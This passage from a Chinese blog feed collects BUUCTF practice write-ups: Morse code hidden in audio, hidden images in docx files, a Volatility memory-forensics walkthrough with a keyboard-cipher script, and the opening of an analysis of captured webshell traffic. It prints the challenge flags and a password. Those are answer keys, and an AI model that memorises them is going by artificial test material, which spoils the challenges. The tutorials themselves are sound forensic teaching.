<p>谁看的出来啊 (｀д′)~ </p>
</blockquote>
<p>将通道分离再合并渲染，就可以得到不相等的一串音频</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BSCTF%202021%5Din_the_vaporwaves/image-20240920014117800.png"
                      alt="image-20240920014117800"
                ></p>
<blockquote>
<p>混音前要先ctrl+a全选中哦</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BSCTF%202021%5Din_the_vaporwaves/image-20240920014213123.png"
                      alt="image-20240920014213123"
                ></p>
<p>观察感觉是摩尔斯电码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BSCTF%202021%5Din_the_vaporwaves/image-20240920014342084.png"
                      alt="image-20240920014342084"
                ></p>
<p>得到电码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">... -.-. - ..-. -.. . ... .---- .-. ...-- ..--.- -.. .-. .. ...- . ... ..--.- .. -. - ----- ..--.- ...- .- .--. --- .-. .-- .--.-. ...- . ...</span><br></pre></td></tr></table></figure></div>

<p>用<a class="link"   href="https://www.lddgo.net/encrypt/morse" >解码网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>一解</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BSCTF%202021%5Din_the_vaporwaves/image-20240920014624314.png"
                      alt="image-20240920014624314"
                ></p>
<p><code>SCTFDES1R3_DRIVES_INT0_VAPORW@VES</code>就是我们的flag了</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一道很需要“眼神”的题目，有的时候就是这样，一眼看不出来就是一眼万年了。。。</p>
<blockquote>
<p>谁有这么好的眼神啊 (╯￣Д￣)╯╘═╛</p>
</blockquote>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.3.5%20%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90][SCTF%202021]in_the_vaporwaves" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>UTCTF2020-docx</title>
    <url>/2024/09/20/ctf/writeup/misc/buuctf/%5BUTCTF2020%5Ddocx/</url>
    <content><![CDATA[<h1 id="UTCTF2020-docx"><a href="#UTCTF2020-docx" class="headerlink" title="[UTCTF2020]docx"></a>[UTCTF2020]docx</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个word的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BUTCTF2020%5Ddocx/image-20240920183308520.png"
                      alt="image-20240920183308520"
                ></p>
<p>进入文档后，检测字体颜色与字体隐藏的隐写，并没有发现flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BUTCTF2020%5Ddocx/image-20240921012422224.png"
                      alt="image-20240921012422224"
                ></p>
<p>试试文档改压缩包，修改文档后缀为.zip，并解压</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BUTCTF2020%5Ddocx/image-20240921002233006.png"
                      alt="image-20240921002233006"
                ></p>
<p>这里可以每个手动去查找，也可以借用工具直接查找文本内容，这里提供<a class="link"   href="https://www.52pojie.cn/thread-1858771-1-1.html" >文件搜索工具 FileLocator Pro <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>这道题比较特殊，直接查找文本是找不到的，所以我们的flag可能不在这里面，或者说是以其他文件形式存在比如png图片等</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BUTCTF2020%5Ddocx/image-20240921003133417.png"
                      alt="image-20240921003133417"
                ></p>

  <div class="note-large info">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>一般word压缩包隐写的图片存放在.&#x2F;word.&#x2F;media文件目录下面</p>

    </div>
  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BUTCTF2020%5Ddocx/image-20240921012531150.png"
                      alt="image-20240921012531150"
                ></p>
<p>这里有这么多图片显然有问题，但目前我们只能挨个查看是否有图片存在异常</p>
<blockquote>
<p>这里留一个坑，应该有那种批量识别图片的工具，我这里懒得找，之后再说吧</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BUTCTF2020%5Ddocx/image-20240921012649697.png"
                      alt="image-20240921012649697"
                ></p>
<p>通过查找，我们在<code>image23.png</code>中成功找到隐藏在图片里面的flag</p>

  <div class="note p-4 mb-4 rounded-small warning fa-solid icon-padding">
    <i class="note-icon fa-solid fa-circle-exclamation"></i><p>这里的flag提交上去需要去掉最前面的<code>ut</code>，即<code>flag{unz1p_3v3ryth1ng}</code></p>

  </div>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一道比较简单的文件隐写题吧，玩玩~</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.5.3%20%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90][UTCTF2020]docx" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>待填坑</tag>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>Word文档隐写-解压2</title>
    <url>/2024/09/20/ctf/writeup/misc/buuctf/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E8%A7%A3%E5%8E%8B2/</url>
    <content><![CDATA[<h1 id="Word文档隐写-解压2"><a href="#Word文档隐写-解压2" class="headerlink" title="[Word文档隐写]解压2"></a>[Word文档隐写]解压2</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个word的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E5%AD%97%E4%BD%93%E9%A2%9C%E8%89%B2/image-20240920183308520.png"
                      alt="image-20240920183308520"
                ></p>
<p>根据题目提示是要以压缩包的形式打开word文档</p>
<p>修改文档后缀为.zip，并解压</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E8%A7%A3%E5%8E%8B1/image-20240921002233006.png"
                      alt="image-20240921002233006"
                ></p>
<p>这里可以每个手动去查找，也可以借用工具直接查找文本内容，这里提供<a class="link"   href="https://www.52pojie.cn/thread-1858771-1-1.html" >文件搜索工具 FileLocator Pro <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>这道题比较特殊，直接查找文本是找不到的，所以我们的flag可能不在这里面，或者说是以其他文件形式存在比如png图片等</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E8%A7%A3%E5%8E%8B2/image-20240921003133417.png"
                      alt="image-20240921003133417"
                ></p>

  <div class="note-large info">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>一般word压缩包隐写的图片存放在.&#x2F;word.&#x2F;media文件目录下面</p>

    </div>
  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="F:/Blog/source/images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E8%A7%A3%E5%8E%8B2/image-20240921004432396.png"
                      alt="image-20240921004432396"
                ></p>
<p>通过查找，成功找到隐藏在图片里面的flag</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一道需要自行查找文件的docx文档隐写，前提要知道能够通过修改扩展名来找到隐藏内容，工具搜索不到文本内容就可能是以其他形式存在，不要遗漏掉</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.5.1%20Word%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99]%E8%A7%A3%E5%8E%8B2" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>Word文档隐写-字体颜色</title>
    <url>/2024/09/20/ctf/writeup/misc/buuctf/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E5%AD%97%E4%BD%93%E9%A2%9C%E8%89%B2/</url>
    <content><![CDATA[<h1 id="Word文档隐写-字体颜色"><a href="#Word文档隐写-字体颜色" class="headerlink" title="[Word文档隐写]字体颜色"></a>[Word文档隐写]字体颜色</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个word的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E5%AD%97%E4%BD%93%E9%A2%9C%E8%89%B2/image-20240920183308520.png"
                      alt="image-20240920183308520"
                ></p>
<p>打开文档，发现是空白的，根据题目是有关字体颜色的隐写，直接全选文字，看看有何猫腻</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E5%AD%97%E4%BD%93%E9%A2%9C%E8%89%B2/image-20240920183922499.png"
                      alt="image-20240920183922499"
                ></p>
<p>表明这里可能存在着文字框</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E5%AD%97%E4%BD%93%E9%A2%9C%E8%89%B2/image-20240920183956952.png"
                      alt="image-20240920183956952"
                ></p>
<p>将其放大并选中黑色字体即可得到flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E5%AD%97%E4%BD%93%E9%A2%9C%E8%89%B2/image-20240920184012604.png"
                      alt="image-20240920184012604"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E5%AD%97%E4%BD%93%E9%A2%9C%E8%89%B2/image-20240920184038954.png"
                      alt="image-20240920184038954"
                ></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一篇小水文~ε٩(๑&gt; ₃ &lt;)۶з</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.5.1%20Word%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99]%E5%AD%97%E4%BD%93%E9%A2%9C%E8%89%B2" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>Word文档隐写-解压1</title>
    <url>/2024/09/20/ctf/writeup/misc/buuctf/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E8%A7%A3%E5%8E%8B1/</url>
    <content><![CDATA[<h1 id="Word文档隐写-解压1"><a href="#Word文档隐写-解压1" class="headerlink" title="[Word文档隐写]解压1"></a>[Word文档隐写]解压1</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个word的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E5%AD%97%E4%BD%93%E9%A2%9C%E8%89%B2/image-20240920183308520.png"
                      alt="image-20240920183308520"
                ></p>
<p>根据题目提示是要以压缩包的形式打开word文档</p>
<p>修改文档后缀为.zip，并解压</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E8%A7%A3%E5%8E%8B1/image-20240921002233006.png"
                      alt="image-20240921002233006"
                ></p>
<p>这里可以每个手动去查找，也可以借用工具直接查找文本内容，这里提供<a class="link"   href="https://www.52pojie.cn/thread-1858771-1-1.html" >文件搜索工具 FileLocator Pro <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E8%A7%A3%E5%8E%8B1/image-20240921002636831.png"
                      alt="image-20240921002636831"
                ></p>
<p>成功找到flag</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一道基础的docx文档隐写，前提要知道能够通过修改扩展名来找到隐藏内容</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.5.1%20Word%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99]%E8%A7%A3%E5%8E%8B1" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>volatility介绍-内存取证*</title>
    <url>/2024/09/26/ctf/writeup/misc/buuctf/%5Bvolatility%E4%BB%8B%E7%BB%8D%5D%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</url>
    <content><![CDATA[<h1 id="volatility介绍-内存取证"><a href="#volatility介绍-内存取证" class="headerlink" title="[volatility介绍]内存取证*"></a>[volatility介绍]内存取证*</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场会给一个压缩包，下载下来解压后会有发现其大小很大，基本就是内存取证了，因为给的是一整个镜像文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5Bvolatility%E4%BB%8B%E7%BB%8D%5D%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20240926134910714.png"
                      alt="image-20240926134910714"
                ></p>
<blockquote>
<p>这里用kali来进行演示</p>
</blockquote>
<p>用<a class="link"   href="https://blog.csdn.net/m0_68012373/article/details/127419463#:~:text=%E4%B8%80%EF%BC%8C%E7%AE%80%E4%BB%8B.%20Vola" >volatility <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>工具进行取证</p>
<a href="/2024/09/25/ctf/data/misc/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/" title="取证分析">取证分析参考文档</a>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vol.py -f Keyboard.raw imageinfo</span><br><span class="line"><span class="comment">#查看/识别镜像信息</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/image-20240926013207143.png"
                      alt="image-20240926013207143"
                ></p>
<p>发现是Win7SP1x64系统</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vol.py -f Keyboard.raw --profile=Win7SP1x64 filescan | grep <span class="string">&quot;keyboard&quot;</span>	</span><br><span class="line"><span class="comment">#指定镜像版本并filescan扫描文件再过滤输出</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/image-20240926013752848.png"
                      alt="image-20240926013752848"
                ></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vol.py -f Keyboard.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003d700880 -D ./test</span><br><span class="line"><span class="comment">#指定镜像版本并dumpfiles指定文件，指定内存中的偏移量并导出到当前文件夹下面的test目录</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/image-20240926014722168.png"
                      alt="image-20240926014722168"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/image-20240926014933567.png"
                      alt="image-20240926014933567"
                ></p>
<p>这时候内存取证就做完了，拿到一串加密字符串</p>
<p><code>CTKQEKNHZHQLLVGKROLATNWGQKRRKQGWNTA</code></p>
<p>由<code>ctfwikiCRYPTO</code>可知在<code>ctfwiki</code>里去查找，解密方式为键盘QWE密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5Bvolatility%E4%BB%8B%E7%BB%8D%5D%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/47c4b2d0e199bba0aa0f6181295e050b.png"
                      alt="在这里插入图片描述"
                ></p>
<p><strong>这里提供一个解密脚本</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#qwe密码解密，输入字符串，返回解密的明文</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_qwe</span>(<span class="params">s</span>):</span><br><span class="line">    DIC_QWE = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnm&quot;</span></span><br><span class="line">    DIC_ABC = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(DIC_ABC)):</span><br><span class="line">            <span class="keyword">if</span> i==DIC_QWE[j]:</span><br><span class="line">                result=result+DIC_ABC[j]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">s=<span class="string">&quot;CTKQEKNHZHQLLVGKROLATNWGQKRRKQGWNTA&quot;</span>	<span class="comment">#------------这里为需要解密的密码--------------</span></span><br><span class="line">s=s.lower()<span class="comment">#统一转化为小写</span></span><br><span class="line">s=s.strip().replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>)<span class="comment">#去掉空格</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(encrypt_qwe(s))</span><br></pre></td></tr></table></figure></div>

<p>解密得出<code>veracrypt password is keyboarddraobyek</code></p>
<p>得到了一个密码<code>keyboarddraobyek</code></p>
<p>这时候需要用到最开始给的文件secret来使用这个密码了</p>
<p>使用<a class="link"   href="https://www.veracrypt.fr/en/Downloads.html" >VeraCrypt <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>打开<code>Secret</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5Bvolatility%E4%BB%8B%E7%BB%8D%5D%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20240926203556035.png"
                      alt="image-20240926203556035"
                ></p>
<p>点击<code>Mount</code>挂载，输入刚才得到的密码<code>KEYBOARDDRAOBYEK</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5Bvolatility%E4%BB%8B%E7%BB%8D%5D%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20240926203642722.png"
                      alt="image-20240926203642722"
                ></p>
<p>而后本机就会多一个G盘，里面就有一个虚拟磁盘<code>here.vhd</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5Bvolatility%E4%BB%8B%E7%BB%8D%5D%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/image-20240926203830424.png"
                      alt="image-20240926203830424"
                ></p>
<p>打开<code>计算机管理</code>，在<code>磁盘管理</code>处右键<code>附加VHD</code>，就会再多一个<code>盘符H</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5Bvolatility%E4%BB%8B%E7%BB%8D%5D%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/02ca8d8f20c1677d323407ec95bd789e.png"
                      alt="附加虚拟盘符"
                ></p>
<p>里面有个假的flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5Bvolatility%E4%BB%8B%E7%BB%8D%5D%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/df0a082d5a9004ad1d2fa4cd1c8e9bea.png"
                      alt="在这里插入图片描述"
                ></p>
<p>然后用<code>NTFS</code>隐写工具<a class="link"   href="https://bbs.kafan.cn/thread-460084-1-1.html#:~:text=NtfsStream" >NtfsStreamsEditor 2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>打开，即可得到flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5Bvolatility%E4%BB%8B%E7%BB%8D%5D%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/8441cfb1fb7d0bd352dfdc318da6b902.png"
                      alt="在这里插入图片描述"
                ></p>
<p>flag为<code>4a02f6dc603c377a234df479609d237c</code></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一道比较考验综合能力的题目，分割看挺简单，加在一起很难立刻联想到下一个，勤加练习吧&#x3D;_&#x3D;</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E5%8D%81%E7%AB%A0][10.1.2%20%E7%A3%81%E7%9B%98%E5%8F%96%E8%AF%81%E6%96%B9%E6%B3%95]%E7%A3%81%E7%9B%98%E5%8F%96%E8%AF%81" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>取证分析</tag>
      </tags>
  </entry>
  <entry>
    <title>webshell混淆流量分析*</title>
    <url>/2024/09/23/ctf/writeup/misc/buuctf/webshell%E6%B7%B7%E6%B7%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="webshell混淆流量分析"><a href="#webshell混淆流量分析" class="headerlink" title="webshell混淆流量分析*"></a>webshell混淆流量分析*</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个流量包的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/webshell%E6%B7%B7%E6%B7%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923190640244.png"
                      alt="image-20240923190640244"
                ></p>
<p>用<a class="link"   href="https://www.wireshark.org/" >wireshark <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>打开进行分析</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/webshell%E6%B7%B7%E6%B7%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923190847605.png"
                      alt="image-20240923190847605"
                ></p>
<p>查看协议分级，看看有哪些是值得分析的（其实可以不做，毕竟新手就http和tcp协议会考）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/webshell%E6%B7%B7%E6%B7%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923191105554.png"
                      alt="image-20240923191105554"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/webshell%E6%B7%B7%E6%B7%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923191155281.png"
                      alt="image-20240923191155281"
                ></p>
<p>过滤http协议，查看协议流</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/webshell%E6%B7%B7%E6%B7%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923191359444.png"
                      alt="image-20240923191359444"
                ></p>
<p>分析看到是一个编码后的webshell（这里不做源码分析，这道题可以看返回结果就知道大概作用）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/webshell%E6%B7%B7%E6%B7%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923191505218.png"
                      alt="image-20240923191505218"
                ></p>
<p>看到返回的内容是列出某目录的文件时间和权限等</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/webshell%E6%B7%B7%E6%B7%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923191525376.png"
                      alt="image-20240923191525376"
                ></p>
<p>在另一个流里面看到有加密的压缩包包含着flag（这就是要解的包）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/webshell%E6%B7%B7%E6%B7%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923191828039.png"
                      alt="image-20240923191828039"
                ></p>
<p>可以先用<code>binwalk</code>把压缩包拿出来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923185919625-1727089160808-1.png"
                      alt="image-20240923185919625"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/webshell%E6%B7%B7%E6%B7%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923191941687.png"
                      alt="image-20240923191941687"
                ></p>
<p>接下来就去寻找密码</p>
<p>从http协议里面找到有一个长度很不正常的包，里面有一个<code>z2</code>，而其值的文件头和<code>jpg</code>的文件头一模一样</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/webshell%E6%B7%B7%E6%B7%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923192308178.png"
                      alt="image-20240923192308178"
                ></p>
<p>而我们之前在文件流里面看到有一个<code>6666.jpg</code>的图片，所以试着还原一下图片</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/webshell%E6%B7%B7%E6%B7%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923192622702.png"
                      alt="image-20240923192622702"
                ></p>
